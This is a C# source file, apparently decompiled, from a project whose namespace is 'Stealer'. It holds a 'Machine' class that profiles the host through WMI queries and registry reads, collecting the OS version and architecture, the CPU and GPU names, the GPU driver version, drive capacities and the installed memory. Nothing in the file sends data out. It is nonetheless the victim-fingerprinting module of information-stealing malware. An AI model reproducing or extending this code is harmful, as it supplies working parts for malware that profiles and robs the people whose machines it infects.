using System;
using System.IO;
using System.Management;
using Microsoft.Win32;

namespace Stealer;

internal class Machine
{
	private static readonly string[] SizeSuffixes = new string[9] { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

	public string osName = string.Empty;

	public string osArchitecture = string.Empty;

	public string osVersion = string.Empty;

	public string processName = string.Empty;

	public string gpuVideo = string.Empty;

	public string gpuVersion = string.Empty;

	public string diskDetails = string.Empty;

	public string pcMemory = string.Empty;

	public Machine()
	{
		OSInfo();
		ProcessorInfo();
		GPUInfo();
		Disk();
		Memory();
	}

	private static string SizeSuffix(long value)
	{
		if (value < 0)
		{
			return "-" + SizeSuffix(-value);
		}
		if (value == 0)
		{
			return "0.0 bytes";
		}
		int num = (int)Math.Log(value, 1024.0);
		decimal num2 = (decimal)value / (decimal)(1L << num * 10);
		return $"{num2:n1} {SizeSuffixes[num]}";
	}

	private void OSInfo()
	{
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
		foreach (ManagementObject item in managementObjectSearcher.Get())
		{
			if (item["Caption"] != null)
			{
				osName = item["Caption"].ToString();
			}
			if (item["OSArchitecture"] != null)
			{
				osArchitecture = item["OSArchitecture"].ToString();
			}
			if (item["Version"] != null)
			{
				osVersion = item["Version"].ToString();
			}
		}
	}

	private void ProcessorInfo()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
		if (registryKey != null && registryKey.GetValue("ProcessorNameString") != null)
		{
			processName = registryKey.GetValue("ProcessorNameString").ToString();
		}
	}

	private void GPUInfo()
	{
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
		foreach (ManagementObject item in managementObjectSearcher.Get())
		{
			gpuVideo = item["VideoProcessor"].ToString();
			gpuVersion = item["DriverVersion"].ToString();
		}
	}

	private void Disk()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				diskDetails += string.Format("Drive {0}\\ - {1}", driveInfo.Name, SizeSuffix(driveInfo.AvailableFreeSpace) + "/" + SizeSuffix(driveInfo.TotalSize) + "\\n");
			}
		}
	}

	private void Memory()
	{
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
		long num = 0L;
		foreach (ManagementObject item in managementObjectSearcher.Get())
		{
			num += Convert.ToInt64(item.Properties["Capacity"].Value);
		}
		pcMemory = SizeSuffix(num);
	}
}
